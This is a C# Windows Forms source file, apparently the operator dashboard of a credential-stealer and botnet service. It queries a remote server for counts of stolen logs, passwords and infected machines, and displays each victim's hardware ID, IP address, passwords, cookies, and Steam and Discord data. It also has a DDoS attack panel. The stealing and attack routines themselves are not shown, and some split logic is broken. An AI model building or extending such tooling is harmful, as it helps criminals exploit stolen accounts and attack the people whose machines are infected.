using Leaf.xNet;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Customer_GUI
{
    public partial class Form1 : Form
    {
        private const string V = "#";
        private string x;

        public Form1()
        {
            InitializeComponent();
        }

        private void light_Click(object sender, EventArgs e)
        {
            if (light.Text == "Light mode."){
                light.Text = "Dark mode.";
                set_light("dark");
            }
            else
            {
                light.Text = "Light mode.";
                set_light("Light.");
            }
        }
        private void set_light(string x)
        {
            if (x == "Light.")
            {
                groupBox1.ForeColor = Color.Black;
                groupBox2.ForeColor = Color.Black;
                Logss.ForeColor = Color.Black;
                Machinecount.ForeColor = Color.Black;

                button4.BackColor = Color.White;
                Logs.BackColor = Color.White;

                Logcount.ForeColor = Color.Black;
                passwordcount.ForeColor = Color.Black;

                BackColor = Color.White;
                light.ForeColor = Color.Black;
                light.BackColor = Color.White;
                label2.ForeColor = Color.Black;
                label1.ForeColor = Color.Black;
                label43.ForeColor = Color.Black;

            }
            else
            {
                label43.ForeColor = Color.White;
                label2.ForeColor = Color.White;
                label1.ForeColor = Color.White;
                groupBox1.ForeColor = Color.White;

                button4.BackColor = Color.Black;
                Logs.BackColor = Color.Black;
                Attack_btn.ForeColor = Color.Black;

                groupBox2.ForeColor = Color.White;
                Logss.ForeColor = Color.White;
                Machinecount.ForeColor = Color.White;
                Logcount.ForeColor = Color.White;
                passwordcount.ForeColor = Color.White;
                BackColor = Color.Black;
                light.ForeColor = Color.White;
                light.BackColor = Color.Black;
            }
        }

        private void Exitbutton_click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            HttpRequest httpRequest = new HttpRequest();

            try
            {
                httpRequest.Get($"http://{Program.SERVER}/");
                checkBox1.ForeColor = Color.Green;
                checkBox1.Checked = true;
            }catch{
                MessageBox.Show("You're not online \n or the server is down.");
                Thread.Sleep(400);
                checkBox1.ForeColor = Color.Red;
            }
            string logscount = httpRequest.Get($"http://{Program.SERVER}/Info").ToString();
            Logcount.Text = $"{logscount.Split("#"[0])} Logs";
            passwordcount.Text = $"{logscount.Split("#"[1])} Passwords";
            Machinecount.Text = $"{logscount.Split("#"[2])} Machines";
        }

        private void Logs_click(object sender, EventArgs e)
        {
            if (Logss.Visible)
            {
                Logss.Visible = false;
            }
            else
            {
                Logss.Visible = true;
                groupBox1.Visible = false;
                groupBox2.Visible = false;
            }
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void button4_Click(object sender, EventArgs e)
        {
            if (groupBox1.Visible)
            {
                groupBox1.Visible = false;
            }
            else
            {
                groupBox1.Visible = true;
                Logss.Visible = false;
                groupBox2.Visible = false;
            }
        }

        private void panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void DDos_click(object sender, EventArgs e)
        {
            if (groupBox2.Visible)
            {
                groupBox2.Visible = false;
            }
            else
            {
                groupBox2.Visible = true;
                Logss.Visible = false;
                groupBox1.Visible = false;
            }
        }

        private void groupBox1_Enter(object sender, EventArgs e)
        {

        }

        private void label4_Click(object sender, EventArgs e)
        {

        }

        private void groupBox2_Enter(object sender, EventArgs e)
        {

        }

        private void groupBox2_Enter_1(object sender, EventArgs e)
        {

        }

        private void label1_Click_1(object sender, EventArgs e)
        {

        }

        private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void groupBox4_Enter(object sender, EventArgs e)
        {

        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }

        private void tableLayoutPanel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void label4_Click_1(object sender, EventArgs e)
        {

        }

        private void label9_Click(object sender, EventArgs e)
        {

        }

        private void label12_Click(object sender, EventArgs e)
        {

        }

        private void HWID1LABEL_Click(object sender, EventArgs e)
        {

        }

        private void IP1_Click(object sender, EventArgs e)
        {
            
        }
        private void setpcs(string info, int pc)
        {
            if (pc == 1)
            {
                string[] split = info.Split('#');
                Hwid1.Text = split[0];
                IPP1.Text = split[1];
                PAssword1.Text = split[3];
                Cookies1.Text = split[4];
                Books1.Text = split[5];
                Steam1.Text = split[6];
                Discord1.Text = split[7];
                Time1.Text = split[8];
            }
            if (pc == 2)
            {
                string[] split = info.Split('#');
                HWID2.Text = split[0];
                IPP2.Text = split[1];
                PAssword2.Text = split[3];
                Cookies2.Text = split[4];
                Books2.Text = split[5];
                Steam2.Text = split[6];
                Discord2.Text = split[7];
                Time2.Text = split[8];
            }
            if (pc == 3)
            {
                string[] split = info.Split('#');
                HWID3.Text = split[0];
                IPP3.Text = split[1];
                PAssword3.Text = split[3];
                Cookies3.Text = split[4];
                Books3.Text = split[5];
                Steam3.Text = split[6];
                Discord3.Text = split[7];
                Time3.Text = split[8];
            }
            if (pc == 4)
            {
                string[] split = info.Split('#');
                HWID4.Text = split[0];
                IPP4.Text = split[1];
                PAssword4.Text = split[3];
                Cookies4.Text = split[4];
                Books4.Text = split[5];
                Steam4.Text = split[6];
                Discord4.Text = split[7];
                Time4.Text = split[8];
            }
            if (pc == 5)
            {
                string[] split = info.Split('#');
                HWID5.Text = split[0];
                IPP5.Text = split[1];
                PAssword5.Text = split[3];
                Cookies5.Text = split[4];
                Books5.Text = split[5];
                Steam5.Text = split[6];
                Discord5.Text = split[7];
                Time5.Text = split[8];
            }
            if (pc == 6)
            {
                string[] split = info.Split('#');
                HWID6.Text = split[0];
                IPP6.Text = split[1];
                PAssword6.Text = split[3];
                Cookies6.Text = split[4];
                Books6.Text = split[5];
                Steam6.Text = split[6];
                Discord6.Text = split[7];
                Time6.Text = split[8];
            }
            if (pc == 7)
            {
                string[] split = info.Split('#');
                HWID7.Text = split[0];
                IPP7.Text = split[1];
                PAssword7.Text = split[3];
                Cookies7.Text = split[4];
                Books7.Text = split[5];
                Steam7.Text = split[6];
                Discord7.Text = split[7];
                Time7.Text = split[8];
            }
            if (pc == 8)
            {
                string[] split = info.Split('#');
                HWID8.Text = split[0];
                IPP8.Text = split[1];
                PAssword8.Text = split[3];
                Cookies8.Text = split[4];
                Books8.Text = split[5];
                Steam8.Text = split[6];
                Discord8.Text = split[7];
                Time8.Text = split[8];
            }
            if (pc == 9)
            {
                string[] split = info.Split('#');
                HWID9.Text = split[0];
                IPP9.Text = split[1];
                PAssword9.Text = split[3];
                Cookies9.Text = split[4];
                Books9.Text = split[5];
                Steam9.Text = split[6];
                Discord9.Text = split[7];
                Time9.Text = split[8];
            }
        }

        private void flowLayoutPanel1_Paint(object sender, PaintEventArgs e)
        {
            HttpRequest httpRequest = new HttpRequest();
            //string request = httpRequest.Get($"http://{Program.SERVER}").ToString();
            int pc = 0;
            string request = "monke#192.168.1.1#100#1288#299#129#333#100#1000";
            foreach (string line in request.Split('\n'))
            {
                pc++;
                string[] split  = line.Split('#');
                setpcs(line, pc);
            }
        }

        private void panel1_Paint_1(object sender, PaintEventArgs e)
        {

        }

        private void label13_Click(object sender, EventArgs e)
        {

        }

        private void label15_Click(object sender, EventArgs e)
        {

        }

        private void label16_Click(object sender, EventArgs e)
        {

        }

        private void label17_Click(object sender, EventArgs e)
        {

        }

        private void label18_Click(object sender, EventArgs e)
        {

        }

        private void pictureBox8_Click(object sender, EventArgs e)
        {

        }

        private void panel13_Paint(object sender, PaintEventArgs e)
        {

        }

        private void HWID2_Click(object sender, EventArgs e)
        {

        }

        private void Steam1_Click(object sender, EventArgs e)
        {

        }

        private void Discord1_Click(object sender, EventArgs e)
        {

        }

        private void Hwid1_Click(object sender, EventArgs e)
        {

        }

        private void label43_Click(object sender, EventArgs e)
        {

        }
    }
}
